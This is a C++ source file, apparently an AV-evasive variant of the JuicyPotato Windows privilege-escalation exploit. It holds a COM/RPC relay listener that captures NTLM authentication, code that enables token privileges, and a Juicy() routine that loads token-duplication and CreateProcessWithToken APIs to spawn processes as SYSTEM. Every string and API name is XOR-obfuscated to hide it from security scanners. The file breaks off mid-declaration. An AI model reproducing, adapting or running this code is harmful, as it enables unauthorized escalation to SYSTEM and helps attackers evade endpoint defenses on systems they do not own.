	 char  hid_shutdo_QgjTI9evphUQ[] = {'\x36','\x2d','\x30','\x31','\x21','\x2a','\x32','\x2b','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_M6bRemdJUYtM = '\x45';
for(int i = 0; i < sizeof(hid_shutdo_QgjTI9evphUQ) / sizeof(hid_shutdo_QgjTI9evphUQ[0]); i++){
hid_shutdo_QgjTI9evphUQ[i] = hid_shutdo_QgjTI9evphUQ[i] ^ k_M6bRemdJUYtM;
}
const int DEFAULT_BUFLEN = 4096;
	WSADATA wsaData;
	int iResult;
	struct addrinfo *result = NULL;
	struct addrinfo hints;
	int iSendResult;
	char *sendbuf;
	char recvbuf[DEFAULT_BUFLEN];
	int recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf(hid_WSASta_ly9y2zL5DyrZ, iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	memset(dcom_port, 0, 12);
	wcstombs(dcom_port, g_port, 12);
	
	// printf("[+] Listening on port:%s\n", dcom_port);
	// Resolve the server address and port
	iResult = getaddrinfo(NULL, dcom_port, &hints, &result);

	if (iResult != 0) {
		printf(hid_getadd_y0nhg9NtQ0Lx, iResult);
		WSACleanup();
		return 1;
	}

	// Create a SOCKET for connecting to server
	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	int optval = 1;
	setsockopt(ListenSocket, SOL_SOCKET, SO_REUSEADDR, (char *)&optval, sizeof(optval));

	if (ListenSocket == INVALID_SOCKET) {
		printf(hid_socket_qkiOpEJGAHVD, WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	// Setup the TCP listening socket
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	//printf("startCOMListener bindresult%d\n", iResult);
	if (iResult == SOCKET_ERROR) {
		printf(hid_bind_f_ElObIXg0G61D, WSAGetLastError());
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	freeaddrinfo(result);

	iResult = listen(ListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		printf(hid_listen_ZEbVMmXAGsvv, WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}
	//---- non block socket server

	timeval timeout = { 1, 0 };
	fd_set fds;
	FD_ZERO(&fds);
	FD_SET(ListenSocket, &fds);

	select(ListenSocket + 1, &fds, NULL, NULL, &timeout);
	if (FD_ISSET(ListenSocket, &fds))
	{
		ClientSocket = accept(ListenSocket, NULL, NULL);
		if (ClientSocket == INVALID_SOCKET) {
			printf(hid_accept_Z9v1XAuQtoQh, WSAGetLastError());
			closesocket(ListenSocket);
			WSACleanup();
			return 1;
		}
	}

	int ntlmLoc;
	do {
		iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0) {
			
			if (!TEST_mode)
				printf(".", iResult);
			
			//check to see if the received packet has NTLM auth information
			processNtlmBytes(recvbuf, iResult);

			//Send all incoming packets to the WinRPC sockets "send queue" and wait for the WinRPC socket to put a packet into our "send queue"
			//put packet in winrpc_sendq
			rpcSendQ->push((char*)&iResult);
			rpcSendQ->push(recvbuf);

			//block and wait for a new item in our sendq
			int* len = (int*)comSendQ->wait_pop();
			sendbuf = comSendQ->wait_pop();

			//Check to see if this is a packet containing NTLM authentication information before sending
			processNtlmBytes(sendbuf, *len);

			//send the new packet sendbuf
			iSendResult = send(ClientSocket, sendbuf, *len, 0);

			if (iSendResult == SOCKET_ERROR) {
				printf(hid_COM____EWuqNrmtlOzb, WSAGetLastError());
				exit(-11);
			}

			//Sometimes Windows likes to open a new connection instead of using the current one
			//Allow for this by waiting for 1s and replacing the ClientSocket if a new connection is incoming
			newConnection = checkForNewConnection(&ListenSocket, &ClientSocket);
		}
		else if (iResult == 0) {
			//connection closing...
			shutdown(ClientSocket, SD_SEND);
			WSACleanup();
			exit(-1);
		}
		else {
			if (!TEST_mode)
				printf(hid_COM____tZ7d8CmCnMhg, WSAGetLastError());

			shutdown(ClientSocket, SD_SEND);
			WSACleanup();

			exit(-1);
		}

	} while (iResult > 0);

	// shutdown the connection since we're done
	iResult = shutdown(ClientSocket, SD_SEND);
	//	printf("startCOMListener iResult ComLisetner:%d\n", iResult);
	if (iResult == SOCKET_ERROR) {
		printf(hid_shutdo_QgjTI9evphUQ, WSAGetLastError());
		closesocket(ClientSocket);
		WSACleanup();
		exit(-1);
	}

	// cleanup
	closesocket(ClientSocket);
	WSACleanup();
	return 0;
}

BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
{
	
	 char  hid_Priv_L_tr1Zx5IKTF97[] = {'\x15','\x37','\x2c','\x33','\x65','\x9','\x2a','\x2a','\x2e','\x30','\x35','\x65','\x3','\x4','\x9','\x16','\x0','\x4f','\x45'};
 char k_weSPrpz1B9ip = '\x45';
for(int i = 0; i < sizeof(hid_Priv_L_tr1Zx5IKTF97) / sizeof(hid_Priv_L_tr1Zx5IKTF97[0]); i++){
hid_Priv_L_tr1Zx5IKTF97[i] = hid_Priv_L_tr1Zx5IKTF97[i] ^ k_weSPrpz1B9ip;
}

	 char  hid_Priv_A_86n91PRxuxvA[] = {'\x15','\x37','\x2c','\x33','\x65','\x4','\x21','\x2f','\x30','\x36','\x31','\x65','\x3','\x4','\x9','\x16','\x0','\x4f','\x45'};
 char k_AgQhstIrovE0 = '\x45';
for(int i = 0; i < sizeof(hid_Priv_A_86n91PRxuxvA) / sizeof(hid_Priv_A_86n91PRxuxvA[0]); i++){
hid_Priv_A_86n91PRxuxvA[i] = hid_Priv_A_86n91PRxuxvA[i] ^ k_AgQhstIrovE0;
}
	typedef bool(__stdcall* _AdjustTokenPrivileges)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
	TCHAR  hid_Advapi_OPQyAzKN0P2v[] = {'\x4','\x21','\x33','\x24','\x35','\x2c','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_XdE56QaAUbH0 = '\x45';
for(int i = 0; i < sizeof(hid_Advapi_OPQyAzKN0P2v) / sizeof(hid_Advapi_OPQyAzKN0P2v[0]); i++){
hid_Advapi_OPQyAzKN0P2v[i] = hid_Advapi_OPQyAzKN0P2v[i] ^ k_XdE56QaAUbH0;
}

	HMODULE hid_hHandl_654flS6Qeo4o = LoadLibrary(hid_Advapi_OPQyAzKN0P2v);
	char  hid_Adjust_C5mtTKcQ6Y3k[] = {'\x4','\x21','\x2f','\x30','\x36','\x31','\x11','\x2a','\x2e','\x20','\x2b','\x15','\x37','\x2c','\x33','\x2c','\x29','\x20','\x22','\x20','\x36','\x45'};
char k_BuXUTMIF63Ji = '\x45';
for(int i = 0; i < sizeof(hid_Adjust_C5mtTKcQ6Y3k) / sizeof(hid_Adjust_C5mtTKcQ6Y3k[0]); i++){
hid_Adjust_C5mtTKcQ6Y3k[i] = hid_Adjust_C5mtTKcQ6Y3k[i] ^ k_BuXUTMIF63Ji;
}

	_AdjustTokenPrivileges hid_Adjust_cqkyOeN4ClCw = (_AdjustTokenPrivileges) GetProcAddress(hid_hHandl_654flS6Qeo4o, hid_Adjust_C5mtTKcQ6Y3k);
TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, priv, &luid))
	{
		printf(hid_Priv_L_tr1Zx5IKTF97);
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!hid_Adjust_cqkyOeN4ClCw(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf(hid_Priv_A_86n91PRxuxvA);
		return FALSE;
	}

	return TRUE;
}


int wmain(int argc, wchar_t** argv)
{
	
	 char  hid________RjSR7Fhfe0bP[] = {'\x74','\x77','\x72','\x6b','\x75','\x6b','\x75','\x6b','\x74','\x45'};
 char k_tr8f9G6uIGbd = '\x45';
for(int i = 0; i < sizeof(hid________RjSR7Fhfe0bP) / sizeof(hid________RjSR7Fhfe0bP[0]); i++){
hid________RjSR7Fhfe0bP[i] = hid________RjSR7Fhfe0bP[i] ^ k_tr8f9G6uIGbd;
}

	 char  hid_Wrong__pRzuv0tFBzUr[] = {'\x12','\x37','\x2a','\x2b','\x22','\x65','\x4','\x37','\x22','\x30','\x28','\x20','\x2b','\x31','\x7f','\x65','\x60','\x36','\x4f','\x45'};
 char k_EDv1upv7k2cZ = '\x45';
for(int i = 0; i < sizeof(hid_Wrong__pRzuv0tFBzUr) / sizeof(hid_Wrong__pRzuv0tFBzUr[0]); i++){
hid_Wrong__pRzuv0tFBzUr[i] = hid_Wrong__pRzuv0tFBzUr[i] ^ k_EDv1upv7k2cZ;
}
BOOL brute = FALSE;

	strcpy(dcom_ip, hid________RjSR7Fhfe0bP);
	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
			case 't':
				++argv;
				--argc;
				processtype = argv[1];
				break;

			case 'p':
				++argv;
				--argc;
				processname = argv[1];
				break;

			case 'l':
				++argv;
				--argc;
				g_port = argv[1];
				break;
			
			case 'c':
				++argv;
				--argc;
				olestr = argv[1];
				break;

			case 'a':
				++argv;
				--argc;
				processargs = argv[1];
				break;

			case 'm':
				++argv;
				--argc;
				memset(dcom_ip, 0, 17);
				wcstombs(dcom_ip, argv[1], wcslen(argv[1]));
				break;

			case 'h':
				usage();
				exit(100);
				break;

			case 'k':
				++argv;
				--argc;
				rpcserver = argv[1];
				break;

			case 'n':
				++argv;
				--argc;
				rpcport = argv[1];
				break;

			case 'z':
				TEST_mode = TRUE;
				break;

			default:
				printf(hid_Wrong__pRzuv0tFBzUr, argv[1]);
				usage();
				exit(-1);
		}

		++argv;
		--argc;
	}

	if (g_port == NULL)
	{
		usage();
		exit(-1);
	}

	if ((processtype == NULL || processname == NULL) && !TEST_mode)
	{
		usage();
		exit(-1);
	}

	// Fallback to default BITS CLSID
	if (olestr == NULL)
		olestr = L"{4991d34b-80a1-4291-83b6-3328366b9097}";

	exit(Juicy(NULL, FALSE));
}

int Juicy(wchar_t *clsid, BOOL brute)
{
	
	 char  hid_Testin_gmnjnxoQjPKP[] = {'\x11','\x20','\x36','\x31','\x2c','\x2b','\x22','\x65','\x60','\x16','\x65','\x60','\x16','\x4f','\x45'};
 char k_NKTMk7ums29G = '\x45';
for(int i = 0; i < sizeof(hid_Testin_gmnjnxoQjPKP) / sizeof(hid_Testin_gmnjnxoQjPKP[0]); i++){
hid_Testin_gmnjnxoQjPKP[i] = hid_Testin_gmnjnxoQjPKP[i] ^ k_NKTMk7ums29G;
}

	 char  hid______a_sudj1JfJRrxN[] = {'\x4f','\x1e','\x6e','\x18','\x65','\x24','\x30','\x31','\x2d','\x37','\x20','\x36','\x30','\x29','\x31','\x65','\x60','\x21','\x4f','\x45'};
 char k_IBwZtji4JmQ0 = '\x45';
for(int i = 0; i < sizeof(hid______a_sudj1JfJRrxN) / sizeof(hid______a_sudj1JfJRrxN[0]); i++){
hid______a_sudj1JfJRrxN[i] = hid______a_sudj1JfJRrxN[i] ^ k_IBwZtji4JmQ0;
}

	 wchar_t  hid_S_e_I__dXLLZSxlTvqz[] = {'\x16','\x20','\xc','\x28','\x35','\x20','\x37','\x36','\x2a','\x2b','\x24','\x31','\x20','\x15','\x37','\x2c','\x33','\x2c','\x29','\x20','\x22','\x20','\x45'};
 wchar_t k_yhsu6IRzhQSU = '\x45';
for(int i = 0; i < sizeof(hid_S_e_I__dXLLZSxlTvqz) / sizeof(hid_S_e_I__dXLLZSxlTvqz[0]); i++){
hid_S_e_I__dXLLZSxlTvqz[i] = hid_S_e_I__dXLLZSxlTvqz[i] ^ k_yhsu6IRzhQSU;
}

	 wchar_t  hid_S_e_A__hA5dzs9mABHd[] = {'\x16','\x20','\x4','\x36','\x36','\x2c','\x22','\x2b','\x15','\x37','\x2c','\x28','\x24','\x37','\x3c','\x11','\x2a','\x2e','\x20','\x2b','\x15','\x37','\x2c','\x33','\x2c','\x29','\x20','\x22','\x20','\x45'};
 wchar_t k_nh6rFWTGI4kx = '\x45';
for(int i = 0; i < sizeof(hid_S_e_A__hA5dzs9mABHd) / sizeof(hid_S_e_A__hA5dzs9mABHd[0]); i++){
hid_S_e_A__hA5dzs9mABHd[i] = hid_S_e_A__hA5dzs9mABHd[i] ^ k_nh6rFWTGI4kx;
}

	 char  hid_____Er_17szv2p6MYWZ[] = {'\x1e','\x68','\x18','\x65','\x0','\x37','\x37','\x2a','\x37','\x65','\x22','\x20','\x31','\x31','\x2c','\x2b','\x22','\x65','\x31','\x2a','\x2e','\x20','\x2b','\x65','\x31','\x3c','\x35','\x20','\x7f','\x65','\x20','\x37','\x37','\x2a','\x37','\x65','\x26','\x2a','\x21','\x20','\x65','\x75','\x3d','\x60','\x29','\x3d','\x4f','\x45'};
 char k_w6bap75KZWH9 = '\x45';
for(int i = 0; i < sizeof(hid_____Er_17szv2p6MYWZ) / sizeof(hid_____Er_17szv2p6MYWZ[0]); i++){
hid_____Er_17szv2p6MYWZ[i] = hid_____Er_17szv2p6MYWZ[i] ^ k_w6bap75KZWH9;
}

	 char  hid_Error__sbtsKiRnM3y2[] = {'\x0','\x37','\x37','\x2a','\x37','\x65','\x22','\x20','\x31','\x31','\x2c','\x2b','\x22','\x65','\x31','\x2a','\x2e','\x20','\x2b','\x65','\x31','\x3c','\x35','\x20','\x7f','\x65','\x20','\x37','\x37','\x2a','\x37','\x65','\x26','\x2a','\x21','\x20','\x65','\x75','\x3d','\x60','\x29','\x3d','\x4f','\x45'};
 char k_OVJXHbNWKq2H = '\x45';
for(int i = 0; i < sizeof(hid_Error__sbtsKiRnM3y2) / sizeof(hid_Error__sbtsKiRnM3y2[0]); i++){
hid_Error__sbtsKiRnM3y2[i] = hid_Error__sbtsKiRnM3y2[i] ^ k_OVJXHbNWKq2H;
}

	 char  hid______C_qRMUVNAEJ984[] = {'\x4f','\x1e','\x68','\x18','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x12','\x2c','\x31','\x2d','\x11','\x2a','\x2e','\x20','\x2b','\x12','\x65','\x3','\x24','\x2c','\x29','\x20','\x21','\x65','\x31','\x2a','\x65','\x26','\x37','\x20','\x24','\x31','\x20','\x65','\x35','\x37','\x2a','\x26','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_W6v888HcrD2e = '\x45';
for(int i = 0; i < sizeof(hid______C_qRMUVNAEJ984) / sizeof(hid______C_qRMUVNAEJ984[0]); i++){
hid______C_qRMUVNAEJ984[i] = hid______C_qRMUVNAEJ984[i] ^ k_W6v888HcrD2e;
}

	 char  hid______C_cKDdakTdj5u3[] = {'\x4f','\x1e','\x6e','\x18','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x12','\x2c','\x31','\x2d','\x11','\x2a','\x2e','\x20','\x2b','\x12','\x65','\xa','\xe','\x4f','\x45'};
 char k_YWfG5FiJArM1 = '\x45';
for(int i = 0; i < sizeof(hid______C_cKDdakTdj5u3) / sizeof(hid______C_cKDdakTdj5u3[0]); i++){
hid______C_cKDdakTdj5u3[i] = hid______C_cKDdakTdj5u3[i] ^ k_YWfG5FiJArM1;
}

	 wchar_t  hid_C______1JskXen3QT1I[] = {'\x6','\x7f','\x19','\x45'};
 wchar_t k_JkPwC0USZgeT = '\x45';
for(int i = 0; i < sizeof(hid_C______1JskXen3QT1I) / sizeof(hid_C______1JskXen3QT1I[0]); i++){
hid_C______1JskXen3QT1I[i] = hid_C______1JskXen3QT1I[i] ^ k_JkPwC0USZgeT;
}

	 char  hid______C_DLTN97J7N3Ac[] = {'\x4f','\x1e','\x68','\x18','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x4','\x36','\x10','\x36','\x20','\x37','\x65','\x3','\x24','\x2c','\x29','\x20','\x21','\x65','\x31','\x2a','\x65','\x26','\x37','\x20','\x24','\x31','\x20','\x65','\x35','\x37','\x2a','\x26','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_Io8NGinAxLYw = '\x45';
for(int i = 0; i < sizeof(hid______C_DLTN97J7N3Ac) / sizeof(hid______C_DLTN97J7N3Ac[0]); i++){
hid______C_DLTN97J7N3Ac[i] = hid______C_DLTN97J7N3Ac[i] ^ k_Io8NGinAxLYw;
}

	 char  hid______C_e01ZaE39NbvN[] = {'\x4f','\x1e','\x6e','\x18','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x4','\x36','\x10','\x36','\x20','\x37','\x65','\xa','\xe','\x4f','\x45'};
 char k_CW2flB7vsrfO = '\x45';
for(int i = 0; i < sizeof(hid______C_e01ZaE39NbvN) / sizeof(hid______C_e01ZaE39NbvN[0]); i++){
hid______C_e01ZaE39NbvN[i] = hid______C_e01ZaE39NbvN[i] ^ k_CW2flB7vsrfO;
}

	 char  hid_Waitin_mLkGuPKnKXIo[] = {'\x12','\x24','\x2c','\x31','\x2c','\x2b','\x22','\x65','\x23','\x2a','\x37','\x65','\x24','\x30','\x31','\x2d','\x6b','\x6b','\x6b','\x45'};
 char k_h4NFRYj78dFv = '\x45';
for(int i = 0; i < sizeof(hid_Waitin_mLkGuPKnKXIo) / sizeof(hid_Waitin_mLkGuPKnKXIo[0]); i++){
hid_Waitin_mLkGuPKnKXIo[i] = hid_Waitin_mLkGuPKnKXIo[i] ^ k_h4NFRYj78dFv;
}
	typedef SECURITY_STATUS(__stdcall* _QuerySecurityContextToken)(PCtxtHandle phContext, void **Token);
	TCHAR  hid_Secur__o44gJxBPWEDp[] = {'\x16','\x20','\x26','\x30','\x37','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_gAfeBrLJAgqG = '\x45';
for(int i = 0; i < sizeof(hid_Secur__o44gJxBPWEDp) / sizeof(hid_Secur__o44gJxBPWEDp[0]); i++){
hid_Secur__o44gJxBPWEDp[i] = hid_Secur__o44gJxBPWEDp[i] ^ k_gAfeBrLJAgqG;
}

	HMODULE hid_hHandl_UTb9sHQAkXmv = LoadLibrary(hid_Secur__o44gJxBPWEDp);
	char  hid_QueryS_ftJqS42T79bS[] = {'\x14','\x30','\x20','\x37','\x3c','\x16','\x20','\x26','\x30','\x37','\x2c','\x31','\x3c','\x6','\x2a','\x2b','\x31','\x20','\x3d','\x31','\x11','\x2a','\x2e','\x20','\x2b','\x45'};
char k_VksZJHalhN8z = '\x45';
for(int i = 0; i < sizeof(hid_QueryS_ftJqS42T79bS) / sizeof(hid_QueryS_ftJqS42T79bS[0]); i++){
hid_QueryS_ftJqS42T79bS[i] = hid_QueryS_ftJqS42T79bS[i] ^ k_VksZJHalhN8z;
}

	_QuerySecurityContextToken hid_QueryS_fJ8A9qL5leI5 = (_QuerySecurityContextToken) GetProcAddress(hid_hHandl_UTb9sHQAkXmv, hid_QueryS_ftJqS42T79bS);
	typedef bool(__stdcall* _CreateProcessAsUserW)(HANDLE hToken, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
	TCHAR  hid_Advapi_5fW9RNxoSDPe[] = {'\x4','\x21','\x33','\x24','\x35','\x2c','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_NCtoJ4ORilrU = '\x45';
for(int i = 0; i < sizeof(hid_Advapi_5fW9RNxoSDPe) / sizeof(hid_Advapi_5fW9RNxoSDPe[0]); i++){
hid_Advapi_5fW9RNxoSDPe[i] = hid_Advapi_5fW9RNxoSDPe[i] ^ k_NCtoJ4ORilrU;
}

	HMODULE hid_hHandl_fTG4gLy0RBFt = LoadLibrary(hid_Advapi_5fW9RNxoSDPe);
	char  hid_Create_8ycZHcYmWC0K[] = {'\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x4','\x36','\x10','\x36','\x20','\x37','\x12','\x45'};
char k_f69z2IcE2X34 = '\x45';
for(int i = 0; i < sizeof(hid_Create_8ycZHcYmWC0K) / sizeof(hid_Create_8ycZHcYmWC0K[0]); i++){
hid_Create_8ycZHcYmWC0K[i] = hid_Create_8ycZHcYmWC0K[i] ^ k_f69z2IcE2X34;
}

	_CreateProcessAsUserW hid_Create_tZgaAp9sT5ro = (_CreateProcessAsUserW) GetProcAddress(hid_hHandl_fTG4gLy0RBFt, hid_Create_8ycZHcYmWC0K);
	typedef bool(__stdcall* _CreateProcessWithTokenW)(HANDLE hToken, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
	TCHAR  hid_Advapi_oOfDx63mv19d[] = {'\x4','\x21','\x33','\x24','\x35','\x2c','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_c0Y4f9jxXmhU = '\x45';
for(int i = 0; i < sizeof(hid_Advapi_oOfDx63mv19d) / sizeof(hid_Advapi_oOfDx63mv19d[0]); i++){
hid_Advapi_oOfDx63mv19d[i] = hid_Advapi_oOfDx63mv19d[i] ^ k_c0Y4f9jxXmhU;
}

	HMODULE hid_hHandl_4cWwxCfBajmN = LoadLibrary(hid_Advapi_oOfDx63mv19d);
	char  hid_Create_PbrnJVeSrz7d[] = {'\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x12','\x2c','\x31','\x2d','\x11','\x2a','\x2e','\x20','\x2b','\x12','\x45'};
char k_pHz1Qw5UGxPF = '\x45';
for(int i = 0; i < sizeof(hid_Create_PbrnJVeSrz7d) / sizeof(hid_Create_PbrnJVeSrz7d[0]); i++){
hid_Create_PbrnJVeSrz7d[i] = hid_Create_PbrnJVeSrz7d[i] ^ k_pHz1Qw5UGxPF;
}

	_CreateProcessWithTokenW hid_Create_h1pqYZd3ouoQ = (_CreateProcessWithTokenW) GetProcAddress(hid_hHandl_4cWwxCfBajmN, hid_Create_PbrnJVeSrz7d);
	typedef bool(__stdcall* _DuplicateTokenEx)(HANDLE hExistingToken, DWORD dwDesiredAccess, LPSECURITY_ATTRIBUTES lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, PHANDLE phNewToken);
	TCHAR  hid_Advapi_nug27jbJawBL[] = {'\x4','\x21','\x33','\x24','\x35','\x2c','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_6QfBYzKB92B6 = '\x45';
for(int i = 0; i < sizeof(hid_Advapi_nug27jbJawBL) / sizeof(hid_Advapi_nug27jbJawBL[0]); i++){
hid_Advapi_nug27jbJawBL[i] = hid_Advapi_nug27jbJawBL[i] ^ k_6QfBYzKB92B6;
}

	HMODULE hid_hHandl_PT6Rz2MnxZW3 = LoadLibrary(hid_Advapi_nug27jbJawBL);
	char  hid_Duplic_1JODVtyfR0fd[] = {'\x1','\x30','\x35','\x29','\x2c','\x26','\x24','\x31','\x20','\x11','\x2a','\x2e','\x20','\x2b','\x0','\x3d','\x45'};
char k_Z61Lqy7Ku8Gp = '\x45';
for(int i = 0; i < sizeof(hid_Duplic_1JODVtyfR0fd) / sizeof(hid_Duplic_1JODVtyfR0fd[0]); i++){
hid_Duplic_1JODVtyfR0fd[i] = hid_Duplic_1JODVtyfR0fd[i] ^ k_Z61Lqy7Ku8Gp;
}

	_DuplicateTokenEx hid_Duplic_7GHdI80ocpw6 = (_DuplicateTokenEx) GetProcAddress(hid_hHandl_PT6Rz2MnxZW3, hid_Duplic_1JODVtyfR0fd);
	typedef bool(__stdcall* _GetTokenInformation)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
	TCHAR  hid_Advapi_w1zmFDAUXI3S[] = {'\x4','\x21','\x33','\x24','\x35','\x2c','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_PjfuVadxJtN1 = '\x45';
for(int i = 0; i < sizeof(hid_Advapi_w1zmFDAUXI3S) / sizeof(hid_Advapi_w1zmFDAUXI3S[0]); i++){
hid_Advapi_w1zmFDAUXI3S[i] = hid_Advapi_w1zmFDAUXI3S[i] ^ k_PjfuVadxJtN1;
}

	HMODULE hid_hHandl_ZHoKq3dfE4vJ = LoadLibrary(hid_Advapi_w1zmFDAUXI3S);
	char  hid_GetTok_QvjK1gD2dnYP[] = {'\x2','\x20','\x31','\x11','\x2a','\x2e','\x20','\x2b','\xc','\x2b','\x23','\x2a','\x37','\x28','\x24','\x31','\x2c','\x2a','\x2b','\x45'};
char k_Q1wv4CpiqTJH = '\x45';
for(int i = 0; i < sizeof(hid_GetTok_QvjK1gD2dnYP) / sizeof(hid_GetTok_QvjK1gD2dnYP[0]); i++){
hid_GetTok_QvjK1gD2dnYP[i] = hid_GetTok_QvjK1gD2dnYP[i] ^ k_Q1wv4CpiqTJH;
}

	_GetTokenInformation hid_GetTok_DcSJLJNPSx4y = (_GetTokenInformation) GetProcAddress(hid_hHandl_ZHoKq3dfE4vJ, hid_GetTok_QvjK1gD2dnYP);
	TCHAR  hid_Advapi_t6K1EapMKD6v[] = {'\x4','\x21','\x33','\x24','\x35','\x2c','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_TPEDdIvVIFyY = '\x45';
for(int i = 0; i < sizeof(hid_Advapi_t6K1EapMKD6v) / sizeof(hid_Advapi_t6K1EapMKD6v[0]); i++){
hid_Advapi_t6K1EapMKD6v[i] = hid_Advapi_t6K1EapMKD6v[i] ^ k_TPEDdIvVIFyY;
}

	HMODULE hid_hHandl_cSANMdoB7yQH = LoadLibrary(hid_Advapi_t6K1EapMKD6v);
	char  hid_GetTok_onPzos0nB3cq[] = {'\x2','\x20','\x31','\x11','\x2a','\x2e','\x20','\x2b','\xc','\x2b','\x23','\x2a','\x37','\x28','\x24','\x31','\x2c','\x2a','\x2b','\x45'};
char k_KnGNhEU3ojL8 = '\x45';
for(int i = 0; i < sizeof(hid_GetTok_onPzos0nB3cq) / sizeof(hid_GetTok_onPzos0nB3cq[0]); i++){
hid_GetTok_onPzos0nB3cq[i] = hid_GetTok_onPzos0nB3cq[i] ^ k_KnGNhEU3ojL8;
}

	_GetTokenInformation hid_GetTok_voHqeSwStO7O = (_GetTokenInformation) GetProcAddress(hid_hHandl_cSANMdoB7yQH, hid_GetTok_onPzos0nB3cq);
	typedef bool(__stdcall* _OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
	TCHAR  hid_Advapi_NcL0nzjjD2xT[] = {'\x4','\x21','\x33','\x24','\x35','\x2c','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_vi94EQ6IY98j = '\x45';
for(int i = 0; i < sizeof(hid_Advapi_NcL0nzjjD2xT) / sizeof(hid_Advapi_NcL0nzjjD2xT[0]); i++){
hid_Advapi_NcL0nzjjD2xT[i] = hid_Advapi_NcL0nzjjD2xT[i] ^ k_vi94EQ6IY98j;
}

	HMODULE hid_hHandl_FQEI0cVSwacj = LoadLibrary(hid_Advapi_NcL0nzjjD2xT);
	char  hid_OpenPr_YKxjXJ7fcz3f[] = {'\xa','\x35','\x20','\x2b','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x11','\x2a','\x2e','\x20','\x2b','\x45'};
char k_R3MmLsDuwrX1 = '\x45';
for(int i = 0; i < sizeof(hid_OpenPr_YKxjXJ7fcz3f) / sizeof(hid_OpenPr_YKxjXJ7fcz3f[0]); i++){
hid_OpenPr_YKxjXJ7fcz3f[i] = hid_OpenPr_YKxjXJ7fcz3f[i] ^ k_R3MmLsDuwrX1;
}

	_OpenProcessToken hid_OpenPr_g36DUBmjbP0v = (_OpenProcessToken) GetProcAddress(hid_hHandl_FQEI0cVSwacj, hid_OpenPr_YKxjXJ7fcz3f);
	TCHAR  hid_Advapi_pD2GAGz57JgG[] = {'\x4','\x21','\x33','\x24','\x35','\x2c','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_tl55ET9iMjY7 = '\x45';
for(int i = 0; i < sizeof(hid_Advapi_pD2GAGz57JgG) / sizeof(hid_Advapi_pD2GAGz57JgG[0]); i++){
hid_Advapi_pD2GAGz57JgG[i] = hid_Advapi_pD2GAGz57JgG[i] ^ k_tl55ET9iMjY7;
}

	HMODULE hid_hHandl_L43qnoSLRpWK = LoadLibrary(hid_Advapi_pD2GAGz57JgG);
	char  hid_OpenPr_0B4cmIDjEomW[] = {'\xa','\x35','\x20','\x2b','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x11','\x2a','\x2e','\x20','\x2b','\x45'};
